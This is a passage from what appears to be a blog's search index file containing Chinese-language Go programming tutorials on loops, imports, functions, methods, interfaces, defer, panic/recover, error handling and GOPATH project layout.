    fmt.Println(<span class="hljs-string">"sum is equal to "</span>, sum)
&#125;
<span class="hljs-comment">// 输出：sum is equal to 45</span></code></pre>
<p>有些时候需要进行多个赋值操作，由于Go里面没有<code>,</code>操作符，那么可以使用平行赋值<code>i, j = i+1, j-1</code></p>
<p>有些时候如果我们忽略<code>expression1</code>和<code>expression3</code>：</p>
<pre><code class="hljs go">sum := <span class="hljs-number">1</span>
<span class="hljs-keyword">for</span> ; sum &lt; <span class="hljs-number">1000</span>;  &#123;
    sum += sum
&#125;</code></pre>
<p>其中<code>;</code>也可以省略，那么就变成如下的代码了，是不是似曾相识？对，这就是<code>while</code>的功能。</p>
<pre><code class="hljs go">sum := <span class="hljs-number">1</span>
<span class="hljs-keyword">for</span> sum &lt; <span class="hljs-number">1000</span> &#123;
    sum += sum
&#125;</code></pre>
<p>在循环里面有两个关键操作<code>break</code>和<code>continue</code> ,<code>break</code>操作是跳出当前循环，<code>continue</code>是跳过本次循环。当嵌套过深的时候，<code>break</code>和<code>continue</code>还可以跟着标号，配合标签使用，即跳转至标签所指定的位置，详细参考如下例子：</p>
<pre><code class="hljs go"><span class="hljs-keyword">for</span> index := <span class="hljs-number">10</span>; index&gt;<span class="hljs-number">0</span>; index-- &#123;
    <span class="hljs-keyword">if</span> index == <span class="hljs-number">5</span>&#123;
        <span class="hljs-keyword">break</span> <span class="hljs-comment">// 或者continue</span>
    &#125;
    fmt.Println(index)
&#125;
<span class="hljs-comment">// break打印出来10、9、8、7、6</span>
<span class="hljs-comment">// continue打印出来10、9、8、7、6、4、3、2、1</span></code></pre>
<p><code>for</code>配合<code>range</code>可以用于读取<code>slice</code>和<code>map</code>的数据：</p>
<pre><code class="hljs go"><span class="hljs-keyword">for</span> k,v:=<span class="hljs-keyword">range</span> <span class="hljs-keyword">map</span> &#123;
    fmt.Println(<span class="hljs-string">"map's key:"</span>,k)
    fmt.Println(<span class="hljs-string">"map's val:"</span>,v)
&#125;</code></pre>
<p>由于 Go 支持 “多值返回”, 而对于“声明而未被调用”的变量, 编译器会报错, 在这种情况下, 可以使用<code>_</code>来丢弃不需要的返回值 例如</p>
<pre><code class="hljs go"><span class="hljs-keyword">for</span> _, v := <span class="hljs-keyword">range</span> <span class="hljs-keyword">map</span>&#123;
    fmt.Println(<span class="hljs-string">"map's val:"</span>, v)
&#125;</code></pre>
<h3 id="无条件跳转"><a class="header-anchor" href="#无条件跳转"></a>无条件跳转</h3>
<p>Go有<code>goto</code>语句，可以用<code>goto</code>跳转到必须在当前函数内定义的标签。例如假设这样一个循环：</p>
<pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">myFunc</span><span class="hljs-params">()</span></span> &#123;
    i := <span class="hljs-number">0</span>
Here:   <span class="hljs-comment">//这行的第一个词，以冒号结束作为标签</span>
    <span class="hljs-built_in">println</span>(i)
    i++
    <span class="hljs-keyword">goto</span> Here   <span class="hljs-comment">//跳转到Here去</span>
&#125;</code></pre>
<blockquote>
<p>标签名是大小写敏感的。</p>
</blockquote>
<h2 id="import"><a class="header-anchor" href="#import"></a>import</h2>
<p>我们在写Go代码的时候经常用到import这个命令用来导入包文件，而我们经常看到的方式参考如下：</p>
<pre><code class="hljs plain">import(
    &quot;fmt&quot;
)</code></pre>
<p>然后我们代码里面可以通过如下的方式调用</p>
<pre><code class="hljs plain">fmt.Println(&quot;hello world&quot;)</code></pre>
<p>上面这个fmt是Go语言的标准库，其实是去<code>GOROOT</code>环境变量指定目录下去加载该模块，当然Go的import还支持如下两种方式来加载自己写的模块：</p>
<p>1.相对路径</p>
<p>import “./myModule” //当前文件同一目录的myModule目录，但是不建议这种方式来import</p>
<p>2.绝对路径</p>
<p>import “shorturl/model” //加载gopath/src/shorturl/model模块</p>
<p>上面展示了一些import常用的几种方式，但是还有一些特殊的import，让很多新手很费解，下面我们来一一讲解一下到底是怎么一回事</p>
<p>1.点操作</p>
<p>我们有时候会看到如下的方式导入包</p>
   <pre><code class="hljs go"><span class="hljs-keyword">import</span>(
    . <span class="hljs-string">"fmt"</span>
)</code></pre>
<p>这个点操作的含义就是这个包导入之后在你调用这个包的函数时，你可以省略前缀的包名，也就是前面你调用的fmt.Println(“hello world”)可以省略的写成Println(“hello world”)</p>
<p>2.别名操作</p>
<p>别名操作顾名思义我们可以把包命名成另一个我们用起来容易记忆的名字</p>
   <pre><code class="hljs go"><span class="hljs-keyword">import</span>(
    f <span class="hljs-string">"fmt"</span>
)</code></pre>
<p>别名操作的话调用包函数时前缀变成了我们的前缀，即f.Println(“hello world”)</p>
<p>3._操作</p>
<p>这个操作经常是让很多人费解的一个操作符，请看下面这个import</p>
   <pre><code class="hljs go"><span class="hljs-keyword">import</span> (
    <span class="hljs-string">"database/sql"</span>
    _ <span class="hljs-string">"github.com/ziutek/mymysql/godrv"</span>
)</code></pre>
<p>_操作其实是引入该包，而不直接使用包里面的函数，而是调用了该包里面的init函数。</p>
<h2 id="函数"><a class="header-anchor" href="#函数"></a>函数</h2>
<p>函数声明</p>
<pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">funcName</span><span class="hljs-params">(input1 type1, input2 type2)</span> <span class="hljs-params">(output1 type1, output2 type2)</span></span> &#123;
    <span class="hljs-comment">//这里是处理逻辑代码</span>
    <span class="hljs-comment">//返回多个值</span>
    <span class="hljs-comment">//output1 和 output2 已在上方定义，这里可以省略，只写return</span>
    <span class="hljs-keyword">return</span> output1,output2
&#125;</code></pre>
<blockquote>
<p>golang 的函数可以返回多个值</p>
<p>input 的 type1 和 type2 相同时，可以只写一个</p>
<p>output 可以省略变量名，只写类型</p>
<p>只有一个 output 时可以省略括号</p>
<p>没有output时就直接省略最后的返回信息</p>
</blockquote>
<h3 id="变参"><a class="header-anchor" href="#变参"></a>变参</h3>
<p>Go函数支持变参。接受变参的函数是有着不定数量的参数的。为了做到这点，首先需要定义函数使其接受变参</p>
<pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">myfunc</span><span class="hljs-params">(arg ...<span class="hljs-keyword">int</span>)</span></span> &#123;&#125;</code></pre>
<p><code>arg ...int</code>告诉Go这个函数接受不定数量的参数。注意，这些参数的类型全部是<code>int</code>。在函数体中，变量<code>arg</code>是一个<code>int</code>的<code>slice</code></p>
<pre><code class="hljs go"><span class="hljs-keyword">package</span> main

<span class="hljs-keyword">import</span> <span class="hljs-string">"fmt"</span>

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">myfunc</span><span class="hljs-params">(arg ...<span class="hljs-keyword">int</span>)</span> <span class="hljs-params">(<span class="hljs-keyword">int</span>,<span class="hljs-keyword">int</span>)</span></span> &#123;
	sum := <span class="hljs-number">0</span>
	<span class="hljs-keyword">for</span> _,a:=<span class="hljs-keyword">range</span> arg &#123;
		sum += a
		fmt.Printf(<span class="hljs-string">"a is %d,sum is %d\n"</span>,a,sum)
	&#125;
	<span class="hljs-keyword">return</span> sum, <span class="hljs-number">1</span>
&#125;

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;
	<span class="hljs-keyword">var</span> slice1 []<span class="hljs-keyword">int</span>
	slice1 = <span class="hljs-built_in">append</span>(slice1,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>)
	sum,_ := myfunc(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>)
	fmt.Printf(<span class="hljs-string">"sum from 1 to 10 is %d\n"</span>, sum)
&#125;</code></pre>
<h3 id="函数作为值、类型"><a class="header-anchor" href="#函数作为值、类型"></a>函数作为值、类型</h3>
<pre><code class="hljs go"><span class="hljs-keyword">type</span> testInt <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(<span class="hljs-keyword">int</span>)</span> <span class="hljs-title">bool</span>  // 声明了一个函数类型</span></code></pre>
<pre><code class="hljs go"><span class="hljs-comment">// 声明的函数类型在这个地方当做了一个参数</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">filter</span><span class="hljs-params">(slice []<span class="hljs-keyword">int</span>, f testInt)</span> []<span class="hljs-title">int</span></span> &#123;
    <span class="hljs-keyword">var</span> result []<span class="hljs-keyword">int</span>
    <span class="hljs-keyword">for</span> _, value := <span class="hljs-keyword">range</span> slice &#123;
        <span class="hljs-keyword">if</span> f(value) &#123;
            result = <span class="hljs-built_in">append</span>(result, value)
        &#125;
    &#125;
    <span class="hljs-keyword">return</span> result
&#125;</code></pre>
<p>函数作为参数传递，在使用上较为灵活，在一些通用接口的开发上也非常有效</p>
<h2 id="指针"><a class="header-anchor" href="#指针"></a>指针</h2>
<p>用法与C中的指针差不多</p>
<p><code>&amp;</code>用于取地址</p>
<p><code>*</code>获取指针指向的值</p>
<h2 id="结构体"><a class="header-anchor" href="#结构体"></a>结构体</h2>
<h3 id="定义结构体"><a class="header-anchor" href="#定义结构体"></a>定义结构体</h3>
<pre><code class="hljs go"><span class="hljs-keyword">type</span> struct_variable_type <span class="hljs-keyword">struct</span> &#123;
   member definition;
   member definition;
   ...
   member definition;
&#125;</code></pre>
<h3 id="访问结构体成员"><a class="header-anchor" href="#访问结构体成员"></a>访问结构体成员</h3>
<p>结构体变量或结构体指针都使用<code>.</code>操作符访问结构体成员</p>
<h3 id="method"><a class="header-anchor" href="#method"></a>method</h3>
<p>在定义函数的时候可以为其指定一个<code>receiver</code>，即该函数属于某一个结构体</p>
<pre><code class="hljs go"><span class="hljs-keyword">type</span> struct1 <span class="hljs-keyword">struct</span> &#123;

&#125;
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(s1 struct1)</span> <span class="hljs-title">test</span><span class="hljs-params">()</span></span> &#123;
   fmt.Printf(<span class="hljs-string">"ahh"</span>)
&#125;

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;
   <span class="hljs-keyword">var</span> str1 struct1
   str1.test()   <span class="hljs-comment">//输出"ahh"</span>
&#125;</code></pre>
<p><code>struct</code>+<code>method</code>==<code>class</code></p>
<p>method不止能用于结构体，还能用于任何其他的自定义类型,比如：</p>
<pre><code class="hljs go"><span class="hljs-keyword">type</span> months <span class="hljs-keyword">map</span>[<span class="hljs-keyword">string</span>]<span class="hljs-keyword">int</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(mon months)</span> <span class="hljs-title">test</span><span class="hljs-params">()</span></span> &#123;
   fmt.Printf(<span class="hljs-string">"ahh"</span>)
&#125;</code></pre>
<h2 id="接口"><a class="header-anchor" href="#接口"></a>接口</h2>
<p>定义方法</p>
<pre><code class="hljs go"><span class="hljs-comment">/* 定义接口 */</span>
<span class="hljs-keyword">type</span> interface_name <span class="hljs-keyword">interface</span> &#123;
   method_name1 [return_type]
   method_name2 [return_type]
   method_name3 [return_type]
   <span class="hljs-comment">//...</span>
   method_namen [return_type]
&#125;

<span class="hljs-comment">/* 定义结构体 */</span>
<span class="hljs-keyword">type</span> struct_name <span class="hljs-keyword">struct</span> &#123;
   <span class="hljs-comment">/* variables */</span>
&#125;

<span class="hljs-comment">/* 实现接口方法 */</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(struct_name_variable struct_name)</span> <span class="hljs-title">method_name1</span><span class="hljs-params">()</span> [<span class="hljs-title">return_type</span>]</span> &#123;
   <span class="hljs-comment">/* 方法实现 */</span>
&#125;
<span class="hljs-comment">//...</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(struct_name_variable struct_name)</span> <span class="hljs-title">method_namen</span><span class="hljs-params">()</span> [<span class="hljs-title">return_type</span>]</span> &#123;
   <span class="hljs-comment">/* 方法实现*/</span>
&#125;</code></pre>
<p>实例如下</p>
<pre><code class="hljs go"><span class="hljs-keyword">type</span> interface1 <span class="hljs-keyword">interface</span>&#123;
   test()
&#125;
<span class="hljs-keyword">type</span> struct1 <span class="hljs-keyword">struct</span> &#123;

&#125;
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(s1 struct1)</span> <span class="hljs-title">test</span><span class="hljs-params">()</span></span> &#123;
   fmt.Printf(<span class="hljs-string">"ahh"</span>)
&#125;

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;
   <span class="hljs-keyword">var</span> inter interface1
   inter = <span class="hljs-built_in">new</span>(struct1)
   inter.test()
&#125;</code></pre>
<p>通过接口，我们就可以使用一个接口来调用多个不同的方法</p>
<h2 id="特性"><a class="header-anchor" href="#特性"></a>特性</h2>
<h3 id="defer"><a class="header-anchor" href="#defer"></a>defer</h3>
<p>defer 语句在函数结束前执行，常用于资源回收</p>
<p>当有多个 defer 语句时，由后向前执行</p>
<pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">ReadWrite</span><span class="hljs-params">()</span> <span class="hljs-title">bool</span></span> &#123;
    file.Open(<span class="hljs-string">"file"</span>)
    <span class="hljs-keyword">defer</span> file.Close()
    <span class="hljs-keyword">if</span> failureX &#123;
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>
    &#125;
    <span class="hljs-keyword">if</span> failureY &#123;
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>
    &#125;
    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>
&#125;</code></pre>
<h3 id="Panic和Recover"><a class="header-anchor" href="#Panic和Recover"></a>Panic和Recover</h3>
<p>panic用于产生一个异常，recover()位于defer语句中，用于捕获异常信息并从异常中恢复</p>
<pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;
   <span class="hljs-keyword">defer</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;
      err := <span class="hljs-built_in">recover</span>()
      <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;
         fmt.Println(<span class="hljs-string">"程序运行中出现异常："</span>, err)
      &#125;
   &#125;()
   <span class="hljs-built_in">panic</span>(<span class="hljs-string">"test panic"</span>)

&#125;</code></pre>
<h3 id="error"><a class="header-anchor" href="#error"></a>error</h3>
<p><code>error</code>是系统自带的一个接口类型的自定义类型，<code>errors</code> 包中包含了一个实现了 <code>error</code> 这个接口的结构体类型 <code>errorString</code>，我们可以直接使用包中的方法来自定义一些错误，从而返回我们希望被上层代码处理的错误信息</p>
<pre><code class="hljs go"><span class="hljs-keyword">package</span> main

<span class="hljs-keyword">import</span> (
    <span class="hljs-string">"errors"</span>
    <span class="hljs-string">"fmt"</span>
)

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;
    t, err := divide(<span class="hljs-number">2</span>, <span class="hljs-number">0</span>)
    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;
        fmt.Println(err)
    &#125; <span class="hljs-keyword">else</span> &#123;
        fmt.Println(t)
    &#125;
&#125;

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">divide</span><span class="hljs-params">(a, b <span class="hljs-keyword">int</span>)</span> <span class="hljs-params">(<span class="hljs-keyword">int</span>, error)</span></span> &#123;
    <span class="hljs-keyword">if</span> b == <span class="hljs-number">0</span> &#123;
        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>, errors.New(<span class="hljs-string">"除数不能为0"</span>)
    &#125;
    <span class="hljs-keyword">return</span> a / b, <span class="hljs-literal">nil</span>
&#125;</code></pre>
]]></content>
      <categories>
        <category>计算机基础</category>
      </categories>
      <tags>
        <tag>golang</tag>
      </tags>
  </entry>
  <entry>
    <title>Golang-项目结构</title>
    <url>/2021/07/17/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/%E5%88%86%E7%B1%BB-%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/go/Golang-%E9%A1%B9%E7%9B%AE%E7%BB%93%E6%9E%84/</url>
    <content><![CDATA[<p>GOPATH下的src目录就是接下来开发程序的主要目录，所有的源码都是放在这个目录下面，那么一般我们的做法就是一个目录一个项目，例如: $GOPATH/src/mymath 表示mymath这个应用包或者可执行应用，这个根据package是main还是其他来决定，main的话就是可执行应用，其他的话就是应用包</p>
<p>所以当新建应用或者一个代码包时都是在src目录下新建一个文件夹，文件夹名称一般是代码包名称，当然也允许多级目录，例如在src下面新建了目录$GOPATH/src/github.com/astaxie/beedb 那么这个包路径就是&quot;<a href="http://github.com/astaxie/beedb">github.com/astaxie/beedb</a>&quot;，包名称是最后一个目录beedb</p>
<pre><code class="hljs plain">bin&#x2F;
    mathapp
pkg&#x2F;
    平台名&#x2F; 如：darwin_amd64、linux_amd64
         mymath.a
         github.com&#x2F;
              astaxie&#x2F;
                   beedb.a
src&#x2F;
    mathapp
          main.go
      mymath&#x2F;
          sqrt.go
      github.com&#x2F;
           astaxie&#x2F;
                beedb&#x2F;
                    beedb.go
                    util.go</code></pre>
<p>Go程序是通过<code>package</code>来组织的</p>
<p><code>package &lt;pkgName&gt;</code>（在我们的例子中是<code>package main</code>）这一行告诉我们当前文件属于哪个包，而包名<code>main</code>则告诉我们它是一个可独立运行的包，它在编译后会产生可执行文件。除了<code>main</code>包之外，其它的包最后都会生成<code>*.a</code>文件（也就是包文件）并放置在<code>$GOPATH/pkg/$GOOS_$GOARCH</code>中（以Mac为例就是<code>$GOPATH/pkg/darwin_amd64</code>）</p>
<blockquote>
<p>每一个可独立运行的Go程序，必定包含一个<code>package main</code>，在这个<code>main</code>包中必定包含一个入口函数<code>main</code>，而这个函数既没有参数，也没有返回值。</p>
</blockquote>
]]></content>
      <categories>
        <category>计算机基础</category>
      </categories>
      <tags>
        <tag>golang</tag>
      </tags>
  </entry>
</search>
